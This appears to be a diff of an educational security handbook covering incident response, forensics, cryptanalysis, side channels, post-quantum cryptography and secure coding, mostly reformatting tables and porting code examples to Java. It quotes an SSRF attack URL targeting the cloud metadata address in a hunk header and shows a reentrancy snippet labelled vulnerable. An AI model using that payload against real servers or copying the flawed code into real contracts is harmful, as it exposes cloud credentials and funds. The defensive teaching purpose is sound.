@@ -3703,47 +3707,40 @@ Attack:             https://api.example.com/fetch?url=http://169.254.169.254/lat
 - Out-of-band communication channel
 
 ### Phase 2: Detection & Analysis
-
 - Initial triage: Is this an incident? What's the scope?
 - Identify indicators of compromise (IoCs)
 - Determine attack vector, affected systems
 - Classify severity (P1 = critical, P4 = low)
 
 **IoC Types:**
-
 - Atomic: IP addresses, domain names, file hashes
 - Computed: regex patterns, YARA rules
 - Behavioral: Sigma rules, TTPs from MITRE ATT&CK
 
 ### Phase 3: Containment
-
 **Short-term containment:** Stop the bleeding — isolate affected systems, change credentials, block attacker IPs.
 
 **Long-term containment:** Deploy fixes while keeping systems running for business continuity.
 
 **Evidence preservation:** Before wiping/rebuilding, capture:
-
 - Memory dump (volatile)
 - Disk image (non-volatile)
 - Network captures
 - Log files
 
 ### Phase 4: Eradication
-
 - Remove malware and backdoors
 - Patch vulnerabilities exploited
 - Reset all possibly-compromised credentials
 - Review for persistence mechanisms (scheduled tasks, registry run keys, cron jobs, startup items)
 
 ### Phase 5: Recovery
-
 - Restore from clean backups
 - Verify system integrity (file hash comparison)
 - Increased monitoring for recurrence
 - Gradual return to production
 
 ### Phase 6: Post-Incident (Lessons Learned)
-
 - What happened? When? How?
 - How was it detected?
 - What worked? What didn't?
@@ -3753,7 +3750,6 @@ Attack:             https://api.example.com/fetch?url=http://169.254.169.254/lat
 ## 30.2 Digital Forensics
 
 ### Forensic Principles
-
 - **Chain of custody**: Document every person who touches evidence
 - **Write blockers**: Prevent modification of evidence drives
 - **Hash verification**: MD5/SHA-256 hash of evidence before and after — prove it wasn't tampered
@@ -3786,7 +3782,6 @@ mount -o ro,loop evidence.img /mnt/evidence
 ```
 
 **Key artifacts:**
-
 - Windows: Registry (NTUSER.DAT, SYSTEM, SAM, SECURITY, SOFTWARE), Prefetch files, Event logs, LNK files, Browser history, MFT ($MFT), Shadow copies
 - Linux: /var/log/, .bash_history, /etc/passwd, cron, systemd journal, /tmp
 
@@ -3809,7 +3804,6 @@ foremost -i capture.pcap -o output/
 ATT&CK is a knowledge base of adversary tactics, techniques, and procedures (TTPs) based on real-world observations.
 
 **Tactics (the "why"):**
-
 ```
 1. Reconnaissance
 2. Resource Development
@@ -3828,7 +3822,6 @@ ATT&CK is a knowledge base of adversary tactics, techniques, and procedures (TTP
 ```
 
 **Use cases:**
-
 - Red team planning: Use ATT&CK to plan realistic attack simulations
 - Detection engineering: Map SIEM rules to ATT&CK techniques
 - Gap analysis: What techniques can't you currently detect?
@@ -3848,13 +3841,13 @@ ATT&CK is a knowledge base of adversary tactics, techniques, and procedures (TTP
 
 Cryptanalysis uses these attack models (in increasing power):
 
-|Model|What Attacker Has|
-|---|---|
-|Ciphertext-only|Ciphertext only|
-|Known-plaintext|Some (plaintext, ciphertext) pairs|
-|Chosen-plaintext (CPA)|Can encrypt chosen messages|
-|Chosen-ciphertext (CCA)|Can decrypt chosen ciphertexts (except target)|
-|Related-key|Access to encryptions under related keys|
+| Model | What Attacker Has |
+|-------|------------------|
+| Ciphertext-only | Ciphertext only |
+| Known-plaintext | Some (plaintext, ciphertext) pairs |
+| Chosen-plaintext (CPA) | Can encrypt chosen messages |
+| Chosen-ciphertext (CCA) | Can decrypt chosen ciphertexts (except target) |
+| Related-key | Access to encryptions under related keys |
 
 A cipher secure against CCA is secure against all weaker models.
 
@@ -3863,7 +3856,6 @@ A cipher secure against CCA is secure against all weaker models.
 Differential cryptanalysis (Biham & Shamir, 1990) analyzes how **differences** between pairs of plaintexts propagate through the cipher to differences in ciphertexts.
 
 **Fundamental idea:**
-
 ```
 P₁ and P₂ = P₁ ⊕ ΔP  (a pair with a chosen XOR difference ΔP)
 
@@ -3875,7 +3867,6 @@ If p >> 2^(-n), the cipher is vulnerable
 ```
 
 **Application to DES:**
-
 - Choose ΔP with specific difference known to propagate with high probability
 - Collect many (P₁, P₂, C₁, C₂) pairs
 - The correct key guess is consistent with more pairs than wrong guesses
@@ -3893,7 +3884,6 @@ P[a] ⊕ C[b] = K[c]   holds with probability 1/2 + ε
 Where P[a] = XOR of certain plaintext bits, C[b] = XOR of certain ciphertext bits, K[c] = XOR of certain key bits.
 
 If ε is large enough and enough known plaintexts are available:
-
 ```
 Advantage ≈ ε² × N   (N = number of known plaintexts)
 ```
@@ -3915,14 +3905,12 @@ This provides a **provable lower bound** on attack difficulty.
 When a decryption oracle reveals whether decrypted padding is valid (or gives a timing difference), an attacker can decrypt ciphertexts without knowing the key.
 
 **PKCS#7 padding in CBC:**
-
 ```
 Block N-1: IV for block N
 Block N:   ... | pad | pad | pad | (e.g., 03 03 03 for 3 bytes of padding)
 ```
 
 **Attack principle:**
-
 1. Modify last byte of C_{N-1}: try all 256 values
 2. One value will produce valid padding (decryption of last byte XORs to 0x01)
 3. From this, derive the plaintext byte
@@ -3940,29 +3928,33 @@ Block N:   ... | pad | pad | pad | (e.g., 03 03 03 for 3 bytes of padding)
 **Timing attacks** exploit the fact that different key bits cause measurably different execution times.
 
 **RSA example:** Square-and-multiply algorithm:
-
 - Extra multiplication when bit = 1 (takes more time)
 - An attacker measuring many decryption times can infer key bits
 
 **Mitigations:**
-
 - **Blinding**: Randomize inputs before computation, remove randomization after
 - **Montgomery Multiplication**: Constant-time algorithm
 - **Constant-time code**: Avoid branches and memory accesses that depend on secret data
 
-```c
-// BAD: timing-variable comparison
-int verify(char *a, char *b) {
-    return strcmp(a, b) == 0;  // exits early on first mismatch!
+```java
+// BAD: timing-variable comparison — exits early on first mismatch
+boolean verifyBad(String a, String b) {
+    return a.equals(b); // or Arrays.equals(a.getBytes(), b.getBytes())
+    // time depends on how many bytes match — leaks info via timing
 }
 
-// GOOD: constant-time comparison
-int verify_constant_time(const uint8_t *a, const uint8_t *b, size_t len) {
-    uint8_t diff = 0;
-    for (size_t i = 0; i < len; i++) {
-        diff |= a[i] ^ b[i];  // accumulate differences, never exit early
-    }
-    return diff == 0;
+// GOOD: constant-time comparison — always takes the same time regardless of content
+boolean verifyConstantTime(byte[] a, byte[] b) {
+    // MessageDigest.isEqual() is constant-time in Java (since Java 6):
+    return MessageDigest.isEqual(a, b);
+}
+
+// Also available in Java security libraries:
+// org.springframework.security.crypto.codec — safeEquals()
+// javax.crypto.Mac — use for HMAC-based comparison
+// Example: compare HMAC tags:
+boolean verifyHmac(byte[] expected, byte[] actual) {
+    return MessageDigest.isEqual(expected, actual); // constant-time ✓
 }
 ```
 
@@ -3986,18 +3978,15 @@ Side-channel attacks exploit **physical implementation information** rather than
 Smart cards and HSMs are particularly vulnerable.
 
 **Simple Power Analysis (SPA):**
-
 - Single power trace reveals operations
 - RSA square-and-multiply: power spike for multiply
 
 **Differential Power Analysis (DPA, Kocher et al., 1998):**
-
 - Collect thousands of power traces
 - Statistical analysis correlates power with key bits
 - Can extract AES keys from unprotected devices with ~1000 traces
 
 **Countermeasures:**
-
 - Randomize operations (random projective coordinates for ECC)
 - Masking: XOR with random value (mask) before processing, remove after
 - Balanced logic: ensure power consumption is independent of data
@@ -4007,14 +3996,12 @@ Smart cards and HSMs are particularly vulnerable.
 These 2018 attacks exploit CPU speculative execution:
 
 **Meltdown (CVE-2017-5754):**
-
 - CPU speculatively executes instructions before checking permissions
 - Speculative access to kernel memory leaves data in CPU cache
 - Cache side-channel (Flush+Reload) extracts data at ~500 KB/s
 - Fixed by OS kernel page-table isolation (KPTI)
 
 **Spectre (CVE-2017-5753, CVE-2017-5715):**
-
 - Trains branch predictor to speculatively execute chosen code paths
 - Leaks cross-process memory (e.g., browser JavaScript can read browser process memory)
 - Difficult to fully mitigate (architecture-level fix needed)
@@ -4044,12 +4031,10 @@ Can spy on other processes' memory access patterns, including AES table lookups.
 ## 33.1 Quantum Computing Threat Model
 
 **Shor's Algorithm** (1994) runs in polynomial time on a quantum computer for:
-
 - Integer factorization → Breaks RSA
 - Discrete logarithm (all groups, including elliptic curves) → Breaks DH, DSA, ECDH, ECDSA, Ed25519
 
 **Timeline estimates:**
-
 - Current (2024): Quantum computers are ~1000s of noisy qubits
 - RSA-2048 requires ~4000 logical (error-corrected) qubits
 - Each logical qubit requires ~1000 physical qubits → ~4 million physical qubits needed
@@ -4061,7 +4046,9 @@ Can spy on other processes' memory access patterns, including AES table lookups.
 
 The basis of CRYSTALS-Kyber and CRYSTALS-Dilithium.
 
-**Learning With Errors (LWE):** Given many (a, b) pairs where b = <a, s> + e mod q (e is small error), find s. This is believed to be hard even for quantum computers.
+**Learning With Errors (LWE):**
+Given many (a, b) pairs where b = <a, s> + e mod q (e is small error), find s.
+This is believed to be hard even for quantum computers.
 
 **Module-LWE (MLWE):** Works over polynomial rings — more efficient than plain LWE.
 
@@ -4084,22 +4071,21 @@ Decapsulate:
 ```
 
 Security parameter comparison:
-
-|Level|Classic Bits|Kyber Variant|PK Size|CT Size|
-|---|---|---|---|---|
-|1|128|Kyber-512|800B|768B|
-|3|192|Kyber-768|1184B|1088B|
-|5|256|Kyber-1024|1568B|1568B|
+| Level | Classic Bits | Kyber Variant | PK Size | CT Size |
+|-------|-------------|---------------|---------|---------|
+| 1 | 128 | Kyber-512 | 800B | 768B |
+| 3 | 192 | Kyber-768 | 1184B | 1088B |
+| 5 | 256 | Kyber-1024 | 1568B | 1568B |
 
 ### CRYSTALS-Dilithium (ML-DSA)
 
 Based on hardness of MLWE and Module Short Integer Solution (MSIS):
 
-|Level|Classic Bits|Variant|PK Size|Sig Size|
-|---|---|---|---|---|
-|2|128|Dilithium2|1312B|2420B|
-|3|192|Dilithium3|1952B|3293B|
-|5|256|Dilithium5|2592B|4595B|
+| Level | Classic Bits | Variant | PK Size | Sig Size |
+|-------|-------------|---------|---------|---------|
+| 2 | 128 | Dilithium2 | 1312B | 2420B |
+| 3 | 192 | Dilithium3 | 1952B | 3293B |
+| 5 | 256 | Dilithium5 | 2592B | 4595B |
 
 ## 33.3 Hash-Based Signatures (SPHINCS+)
 
@@ -4158,7 +4144,6 @@ Ethereum smart contracts are programs on the blockchain — immutable once deplo
 **Common vulnerabilities:**
 
 **Reentrancy:** A contract calls an external contract, which calls back before state is updated:
-
 ```solidity
 // VULNERABLE:
 function withdraw(uint amount) public {
@@ -4182,7 +4167,6 @@ function withdraw(uint amount) public {
 Security must be integrated throughout development, not bolted on at the end.
 
 **Microsoft SDL phases:**
-
 ```
 1. Training     → Security training for all developers
 2. Requirements → Define security requirements, misuse cases
@@ -4197,25 +4181,54 @@ Security must be integrated throughout development, not bolted on at the end.
 
 Design systems to swap cryptographic algorithms without architecture changes:
 
-```python
-# BAD: Hardcoded algorithm
-def encrypt(data, key):
-    cipher = AES.new(key, AES.MODE_CBC, iv=os.urandom(16))
-    return cipher.encrypt(pad(data))
+```java
+import javax.crypto.*;
+import javax.crypto.spec.*;
+import java.security.*;
 
-# GOOD: Algorithm is configurable
-ALGORITHM = config.get("encryption_algorithm", "AES-256-GCM")
-KEY_SIZE   = config.get("key_size_bytes", 32)
+// BAD: Hardcoded algorithm — impossible to migrate without code changes
+public byte[] encryptBad(byte[] data, SecretKey key) throws Exception {
+    Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding"); // hardcoded
+    cipher.init(Cipher.ENCRYPT_MODE, key);
+    return cipher.doFinal(data);
+}
 
-def encrypt(data, key, algorithm=ALGORITHM):
-    if algorithm == "AES-256-GCM":
-        ...
-    elif algorithm == "CHACHA20-POLY1305":
-        ...
+// GOOD: Algorithm driven by configuration — cryptographic agility
+public class CryptoService {
+    private final String algorithm;
+    private final int keySize;
+
+    public CryptoService(String algorithm, int keySize) {
+        this.algorithm = algorithm; // e.g., "AES/GCM/NoPadding"
+        this.keySize   = keySize;   // e.g., 256
+    }
+
+    public byte[] encrypt(byte[] data, SecretKey key) throws Exception {
+        switch (algorithm) {
+            case "AES/GCM/NoPadding": {
+                byte[] iv = new byte[12];
+                new SecureRandom().nextBytes(iv);
+                GCMParameterSpec spec = new GCMParameterSpec(128, iv);
+                Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
+                c.init(Cipher.ENCRYPT_MODE, key, spec);
+                return c.doFinal(data);
+            }
+            case "ChaCha20-Poly1305": {
+                byte[] nonce = new byte[12];
+                new SecureRandom().nextBytes(nonce);
+                AlgorithmParameterSpec spec = new IvParameterSpec(nonce);
+                Cipher c = Cipher.getInstance("ChaCha20-Poly1305");
+                c.init(Cipher.ENCRYPT_MODE, key, spec);
+                return c.doFinal(data);
+            }
+            default: throw new IllegalArgumentException("Unknown algorithm: " + algorithm);
+        }
+    }
+}
+// Load from config: new CryptoService(System.getProperty("crypto.alg","AES/GCM/NoPadding"), 256)
 ```
 
 **Cryptographic agility is essential for:**
-
 - Responding to new vulnerabilities (SHA-1 collision → migrate to SHA-256)
 - Post-quantum migration (swap ECDH for Kyber)
 - Meeting new compliance requirements
@@ -4224,22 +4237,21 @@ def encrypt(data, key, algorithm=ALGORITHM):
 
 **Never hardcode secrets in source code.** Use:
 
-|Solution|Use Case|
-|---|---|
-|Environment variables|Simple deployments, development|
-|HashiCorp Vault|Enterprise secrets management|
-|AWS Secrets Manager / Parameter Store|AWS deployments|
-|Azure Key Vault|Azure deployments|
-|GCP Secret Manager|GCP deployments|
-|Kubernetes Secrets (+ sealed secrets or Vault injection)|Container deployments|
-|HSM (Hardware Security Module)|Key storage for highest-security keys|
+| Solution | Use Case |
+|----------|---------|
+| Environment variables | Simple deployments, development |
+| HashiCorp Vault | Enterprise secrets management |
+| AWS Secrets Manager / Parameter Store | AWS deployments |
+| Azure Key Vault | Azure deployments |
+| GCP Secret Manager | GCP deployments |
+| Kubernetes Secrets (+ sealed secrets or Vault injection) | Container deployments |
+| HSM (Hardware Security Module) | Key storage for highest-security keys |
 
 **Secret rotation:** Secrets should be rotated regularly and immediately upon suspected compromise. Design systems to handle credential rotation without downtime.
 
 ## 35.4 Cryptography Implementation Guidelines
 
 **Dos:**
-
 - ✅ Use well-audited libraries (OpenSSL, BouncyCastle, libsodium, cryptography.io)
 - ✅ Use AEAD modes (AES-GCM, ChaCha20-Poly1305)
 - ✅ Use Argon2id for password hashing
@@ -4253,7 +4265,6 @@ def encrypt(data, key, algorithm=ALGORITHM):
 - ✅ Store keys in secure storage (HSM, key management service)
 
 **Don'ts:**
-
 - ❌ Never implement your own cryptographic algorithms
 - ❌ Never use ECB mode
 - ❌ Never use MD5 or SHA-1 for security purposes
@@ -4270,13 +4281,11 @@ def encrypt(data, key, algorithm=ALGORITHM):
 Traditional security: "Trust everything inside the perimeter." Zero Trust: "Never trust, always verify."
 
 **Zero Trust Principles:**
-
 1. **Verify explicitly**: Always authenticate and authorize based on all available data points (identity, location, device health, service, workload, data classification)
 2. **Use least privilege**: Limit user access with just-in-time and just-enough-access, risk-based adaptive policies, and data protection
 3. **Assume breach**: Minimize blast radius, encrypt end-to-end, use analytics to get visibility, drive threat detection
 
 **Zero Trust components:**
-
 - Strong identity (MFA for all users, device management)
 - Micro-segmentation (each service can only talk to explicitly authorized services)
 - Endpoint security (managed devices with EDR)
@@ -4289,7 +4298,6 @@ Traditional security: "Trust everything inside the perimeter." Zero Trust: "Neve
 You can't improve what you can't measure:
 
 **Key metrics:**
-
 - **MTTD (Mean Time to Detect)**: How long until a breach is discovered? Industry average: 194 days
 - **MTTR (Mean Time to Respond)**: How long to contain a breach?
 - **Vulnerability Remediation SLAs**: Critical patch in 24h, High in 7 days, Medium in 30 days
@@ -4308,46 +4316,43 @@ You can't improve what you can't measure:
 ## Appendix A: Cryptographic Standards Reference
 
 ### NIST Standards
-
-|Standard|Content|
-|---|---|
-|FIPS 197|AES|
-|FIPS 186-5|DSS (RSA, ECDSA, EdDSA)|
-|FIPS 198-1|HMAC|
-|FIPS 202|SHA-3|
-|FIPS 180-4|SHA-1, SHA-2|
-|FIPS 203|ML-KEM (Kyber)|
-|FIPS 204|ML-DSA (Dilithium)|
-|FIPS 205|SLH-DSA (SPHINCS+)|
-|SP 800-38A|Block cipher modes (ECB, CBC, CFB, OFB, CTR)|
-|SP 800-38D|GCM mode|
-|SP 800-57|Key management recommendations|
-|SP 800-90A|RNGs (HMAC-DRBG, CTR-DRBG)|
-|SP 800-131A|Transitioning cryptographic algorithms|
+| Standard | Content |
+|---------|---------|
+| FIPS 197 | AES |
+| FIPS 186-5 | DSS (RSA, ECDSA, EdDSA) |
+| FIPS 198-1 | HMAC |
+| FIPS 202 | SHA-3 |
+| FIPS 180-4 | SHA-1, SHA-2 |
+| FIPS 203 | ML-KEM (Kyber) |
+| FIPS 204 | ML-DSA (Dilithium) |
+| FIPS 205 | SLH-DSA (SPHINCS+) |
+| SP 800-38A | Block cipher modes (ECB, CBC, CFB, OFB, CTR) |
+| SP 800-38D | GCM mode |
+| SP 800-57 | Key management recommendations |
+| SP 800-90A | RNGs (HMAC-DRBG, CTR-DRBG) |
+| SP 800-131A | Transitioning cryptographic algorithms |
 
 ### RFC Reference (Key Cryptographic RFCs)
-
-|RFC|Content|
-|---|---|
-|RFC 5246|TLS 1.2|
-|RFC 8446|TLS 1.3|
-|RFC 5652|CMS (Cryptographic Message Syntax)|
-|RFC 5280|X.509 PKI|
-|RFC 5869|HKDF|
-|RFC 6979|Deterministic ECDSA|
-|RFC 7748|Curve25519, Curve448|
-|RFC 8032|Ed25519, Ed448|
-|RFC 7517|JSON Web Key (JWK)|
-|RFC 7519|JSON Web Token (JWT)|
-|RFC 4226|HOTP|
-|RFC 6238|TOTP|
+| RFC | Content |
+|-----|---------|
+| RFC 5246 | TLS 1.2 |
+| RFC 8446 | TLS 1.3 |
+| RFC 5652 | CMS (Cryptographic Message Syntax) |
+| RFC 5280 | X.509 PKI |
+| RFC 5869 | HKDF |
+| RFC 6979 | Deterministic ECDSA |
+| RFC 7748 | Curve25519, Curve448 |
+| RFC 8032 | Ed25519, Ed448 |
+| RFC 7517 | JSON Web Key (JWK) |
+| RFC 7519 | JSON Web Token (JWT) |
+| RFC 4226 | HOTP |
+| RFC 6238 | TOTP |
 
 ---
 
 ## Appendix B: Algorithm Quick-Reference Card
 
 ### Symmetric Encryption
-
 ```
 ✅ AES-256-GCM           (AEAD, most common)
 ✅ ChaCha20-Poly1305     (AEAD, high performance, no hardware needed)
@@ -4358,7 +4363,6 @@ You can't improve what you can't measure:
 ```
 
 ### Asymmetric Encryption
-
 ```
 ✅ RSA-OAEP (3072+ bits)
 ✅ ECIES (P-256 or Curve25519)
@@ -4368,7 +4372,6 @@ You can't improve what you can't measure:
 ```
 
 ### Digital Signatures
-
 ```
 ✅ Ed25519               (fastest, safest)
 ✅ ECDSA P-256           (widely supported)
@@ -4379,7 +4382,6 @@ You can't improve what you can't measure:
 ```
 
 ### Key Agreement
-
 ```
 ✅ X25519 (ECDH with Curve25519)
 ✅ ECDH P-256
@@ -4389,7 +4391,6 @@ You can't improve what you can't measure:
 ```
 
 ### Hashing
-
 ```
 ✅ SHA-256 / SHA-384 / SHA-512
 ✅ SHA3-256 / SHA3-512
@@ -4399,7 +4400,6 @@ You can't improve what you can't measure:
 ```
 
 ### Password Hashing
-
 ```
 ✅ Argon2id              (best choice)
 ✅ bcrypt (cost ≥12)     (acceptable, legacy compat)
@@ -4410,7 +4410,6 @@ You can't improve what you can't measure:
 ```
 
 ### MACs
-
 ```
 ✅ HMAC-SHA256 / HMAC-SHA384
 ✅ Poly1305 (via ChaCha20-Poly1305)
@@ -4423,7 +4422,6 @@ You can't improve what you can't measure:
 ## Appendix C: Port Reference for Security Professionals
 
 ### Commonly Targeted Services
-
 ```
 21    FTP (unencrypted) → Brute force, anonymous login, bounce attacks
 22    SSH → Brute force, old OpenSSH vulns
@@ -4447,7 +4445,6 @@ You can't improve what you can't measure:
 ## Appendix D: Security Checklists
 
 ### TLS Configuration Checklist
-
 - [ ] TLS 1.2 minimum (TLS 1.3 preferred)
 - [ ] Disable SSL 2.0, SSL 3.0, TLS 1.0, TLS 1.1
 - [ ] Only forward-secret cipher suites (ECDHE or DHE)
@@ -4463,7 +4460,6 @@ You can't improve what you can't measure:
 Test with: `ssl-labs.com/ssltest/` or `testssl.sh`
 
 ### Web Application Security Checklist
-
 - [ ] All inputs validated and sanitized server-side
 - [ ] Parameterized queries (no string concatenation for SQL)
 - [ ] HTML encoding of all output (prevent XSS)
@@ -4474,12 +4470,11 @@ Test with: `ssl-labs.com/ssltest/` or `testssl.sh`
 - [ ] Authentication with MFA
 - [ ] Rate limiting and account lockout
 - [ ] Sensitive data encrypted at rest
-- [ ] Dependencies regularly updated (npm audit, pip-audit, dependabot)
+- [ ] Dependencies regularly updated (Maven `dependency-check`, Gradle `dependencyCheckAnalyze`, GitHub Dependabot)
 - [ ] Security scanning in CI/CD (SAST, DAST, SCA)
 - [ ] No secrets in code (secret scanning)
 
 ### Password Hashing Checklist
-
 - [ ] Using Argon2id, bcrypt, or scrypt (not MD5/SHA-1)
 - [ ] Salt generated with CSPRNG, minimum 16 bytes
 - [ ] Iterations/cost factor meeting 2024 OWASP recommendations
@@ -4490,131 +4485,126 @@ Test with: `ssl-labs.com/ssltest/` or `testssl.sh`
 
 ## Appendix E: Glossary
 
-|Term|Definition|
-|---|---|
-|**AAD**|Additional Authenticated Data — authenticated but not encrypted in AEAD|
-|**AEAD**|Authenticated Encryption with Associated Data — encryption + integrity in one|
-|**APT**|Advanced Persistent Threat — sophisticated, long-duration targeted attack|
-|**ARP**|Address Resolution Protocol — maps IP to MAC addresses|
-|**ASN.1**|Abstract Syntax Notation One — data encoding standard for cryptographic structures|
-|**BGP**|Border Gateway Protocol — internet inter-domain routing protocol|
-|**CA**|Certificate Authority — trusted entity that issues digital certificates|
-|**CIDR**|Classless Inter-Domain Routing — IP addressing notation with prefix length|
-|**CRL**|Certificate Revocation List — list of revoked certificates|
-|**CSRF**|Cross-Site Request Forgery — tricks browsers into making unauthorized requests|
-|**CTR**|Counter mode — block cipher mode creating a stream cipher|
-|**DER**|Distinguished Encoding Rules — binary ASN.1 encoding|
-|**DH**|Diffie-Hellman — key agreement protocol|
-|**DLP**|Discrete Logarithm Problem — hard mathematical problem underlying DH, DSA|
-|**DMZ**|Demilitarized Zone — network segment between internet and internal network|
-|**DNS**|Domain Name System — maps hostnames to IP addresses|
-|**DoS/DDoS**|Denial of Service / Distributed DoS — attack on availability|
-|**DSA**|Digital Signature Algorithm — US federal standard for digital signatures|
-|**ECDH**|Elliptic Curve Diffie-Hellman — key agreement using elliptic curves|
-|**ECDLP**|Elliptic Curve Discrete Logarithm Problem — hard problem underlying ECC|
-|**ECDSA**|Elliptic Curve Digital Signature Algorithm|
-|**EdDSA**|Edwards Curve Digital Signature Algorithm (e.g., Ed25519)|
-|**EKU**|Extended Key Usage — certificate extension specifying allowed uses|
-|**FCS**|Frame Check Sequence — Ethernet checksum|
-|**GCM**|Galois/Counter Mode — AEAD mode for AES|
-|**GHASH**|Galois Hash — authentication function in GCM|
-|**HKDF**|HMAC-based Key Derivation Function|
-|**HMAC**|Hash-based Message Authentication Code|
-|**HSM**|Hardware Security Module — tamper-resistant key storage|
-|**HTTPS**|HTTP over TLS|
-|**IDS/IPS**|Intrusion Detection/Prevention System|
-|**IKE**|Internet Key Exchange — used in IPSec|
-|**IV**|Initialization Vector — per-message randomness for block ciphers|
-|**KDF**|Key Derivation Function|
-|**KEM**|Key Encapsulation Mechanism|
-|**LDAP**|Lightweight Directory Access Protocol|
-|**LFSR**|Linear Feedback Shift Register|
-|**MAC**|Message Authentication Code (also: Media Access Control address)|
-|**MITM**|Man-in-the-Middle attack|
-|**MFA**|Multi-Factor Authentication|
-|**MLWE**|Module Learning With Errors — lattice problem|
-|**MTU**|Maximum Transmission Unit|
-|**NAT**|Network Address Translation|
-|**NIST**|National Institute of Standards and Technology (US)|
-|**OCSP**|Online Certificate Status Protocol|
-|**OTP**|One-Time Pad (also: One-Time Password)|
-|**PBKDF2**|Password-Based Key Derivation Function 2|
-|**PEM**|Privacy Enhanced Mail — base64+header encoding for certs/keys|
-|**PFS**|Perfect Forward Secrecy|
-|**PKI**|Public Key Infrastructure|
-|**PRNG/CSPRNG**|Pseudorandom Number Generator / Cryptographically Secure PRNG|
-|**RSA**|Rivest-Shamir-Adleman public key algorithm|
-|**SAE**|Simultaneous Authentication of Equals — WPA3 protocol|
-|**SAN**|Subject Alternative Name — certificate extension for hostnames|
-|**SIEM**|Security Information and Event Management|
-|**SNI**|Server Name Indication — TLS extension for virtual hosting|
-|**SNMP**|Simple Network Management Protocol|
-|**SSRF**|Server-Side Request Forgery|
-|**TLS**|Transport Layer Security|
-|**TTL**|Time to Live (IP) / Time to Live (DNS TTL/cache time)|
-|**VPN**|Virtual Private Network|
-|**WAF**|Web Application Firewall|
-|**XSS**|Cross-Site Scripting|
-|**ZKP**|Zero-Knowledge Proof|
+| Term | Definition |
+|------|-----------|
+| **AAD** | Additional Authenticated Data — authenticated but not encrypted in AEAD |
+| **AEAD** | Authenticated Encryption with Associated Data — encryption + integrity in one |
+| **APT** | Advanced Persistent Threat — sophisticated, long-duration targeted attack |
+| **ARP** | Address Resolution Protocol — maps IP to MAC addresses |
+| **ASN.1** | Abstract Syntax Notation One — data encoding standard for cryptographic structures |
+| **BGP** | Border Gateway Protocol — internet inter-domain routing protocol |
+| **CA** | Certificate Authority — trusted entity that issues digital certificates |
+| **CIDR** | Classless Inter-Domain Routing — IP addressing notation with prefix length |
+| **CRL** | Certificate Revocation List — list of revoked certificates |
+| **CSRF** | Cross-Site Request Forgery — tricks browsers into making unauthorized requests |
+| **CTR** | Counter mode — block cipher mode creating a stream cipher |
+| **DER** | Distinguished Encoding Rules — binary ASN.1 encoding |
+| **DH** | Diffie-Hellman — key agreement protocol |
+| **DLP** | Discrete Logarithm Problem — hard mathematical problem underlying DH, DSA |
+| **DMZ** | Demilitarized Zone — network segment between internet and internal network |
+| **DNS** | Domain Name System — maps hostnames to IP addresses |
+| **DoS/DDoS** | Denial of Service / Distributed DoS — attack on availability |
+| **DSA** | Digital Signature Algorithm — US federal standard for digital signatures |
+| **ECDH** | Elliptic Curve Diffie-Hellman — key agreement using elliptic curves |
+| **ECDLP** | Elliptic Curve Discrete Logarithm Problem — hard problem underlying ECC |
+| **ECDSA** | Elliptic Curve Digital Signature Algorithm |
+| **EdDSA** | Edwards Curve Digital Signature Algorithm (e.g., Ed25519) |
+| **EKU** | Extended Key Usage — certificate extension specifying allowed uses |
+| **FCS** | Frame Check Sequence — Ethernet checksum |
+| **GCM** | Galois/Counter Mode — AEAD mode for AES |
+| **GHASH** | Galois Hash — authentication function in GCM |
+| **HKDF** | HMAC-based Key Derivation Function |
+| **HMAC** | Hash-based Message Authentication Code |
+| **HSM** | Hardware Security Module — tamper-resistant key storage |
+| **HTTPS** | HTTP over TLS |
+| **IDS/IPS** | Intrusion Detection/Prevention System |
+| **IKE** | Internet Key Exchange — used in IPSec |
+| **IV** | Initialization Vector — per-message randomness for block ciphers |
+| **KDF** | Key Derivation Function |
+| **KEM** | Key Encapsulation Mechanism |
+| **LDAP** | Lightweight Directory Access Protocol |
+| **LFSR** | Linear Feedback Shift Register |
+| **MAC** | Message Authentication Code (also: Media Access Control address) |
+| **MITM** | Man-in-the-Middle attack |
+| **MFA** | Multi-Factor Authentication |
+| **MLWE** | Module Learning With Errors — lattice problem |
+| **MTU** | Maximum Transmission Unit |
+| **NAT** | Network Address Translation |
+| **NIST** | National Institute of Standards and Technology (US) |
+| **OCSP** | Online Certificate Status Protocol |
+| **OTP** | One-Time Pad (also: One-Time Password) |
+| **PBKDF2** | Password-Based Key Derivation Function 2 |
+| **PEM** | Privacy Enhanced Mail — base64+header encoding for certs/keys |
+| **PFS** | Perfect Forward Secrecy |
+| **PKI** | Public Key Infrastructure |
+| **PRNG/CSPRNG** | Pseudorandom Number Generator / Cryptographically Secure PRNG |
+| **RSA** | Rivest-Shamir-Adleman public key algorithm |
+| **SAE** | Simultaneous Authentication of Equals — WPA3 protocol |
+| **SAN** | Subject Alternative Name — certificate extension for hostnames |
+| **SIEM** | Security Information and Event Management |
+| **SNI** | Server Name Indication — TLS extension for virtual hosting |
+| **SNMP** | Simple Network Management Protocol |
+| **SSRF** | Server-Side Request Forgery |
+| **TLS** | Transport Layer Security |
+| **TTL** | Time to Live (IP) / Time to Live (DNS TTL/cache time) |
+| **VPN** | Virtual Private Network |
+| **WAF** | Web Application Firewall |
+| **XSS** | Cross-Site Scripting |
+| **ZKP** | Zero-Knowledge Proof |
 
 ---
 
 ## Appendix F: Essential Security Tools
 
 ### Cryptography & PKI
-
-|Tool|Purpose|
-|---|---|
-|`openssl`|Swiss army knife for certs, TLS, encoding|
-|`gnutls-cli`|TLS client for testing|
-|`certtool`|Certificate management (GnuTLS)|
-|`hashcat`|GPU password hash cracker (for testing)|
-|`john`|CPU password cracker|
-|`ssh-keygen`|Generate SSH keys|
+| Tool | Purpose |
+|------|---------|
+| `openssl` | Swiss army knife for certs, TLS, encoding |
+| `gnutls-cli` | TLS client for testing |
+| `certtool` | Certificate management (GnuTLS) |
+| `hashcat` | GPU password hash cracker (for testing) |
+| `john` | CPU password cracker |
+| `ssh-keygen` | Generate SSH keys |
 
 ### Network Analysis
-
-|Tool|Purpose|
-|---|---|
-|`wireshark` / `tshark`|Packet capture and analysis|
-|`tcpdump`|Command-line packet capture|
-|`nmap`|Network scanning|
-|`masscan`|High-speed port scanner|
-|`netstat` / `ss`|Connection and socket state|
-|`traceroute` / `tracepath`|Network path analysis|
-|`dig` / `nslookup`|DNS lookup|
-|`curl` / `wget`|HTTP client with SSL info|
+| Tool | Purpose |
+|------|---------|
+| `wireshark` / `tshark` | Packet capture and analysis |
+| `tcpdump` | Command-line packet capture |
+| `nmap` | Network scanning |
+| `masscan` | High-speed port scanner |
+| `netstat` / `ss` | Connection and socket state |
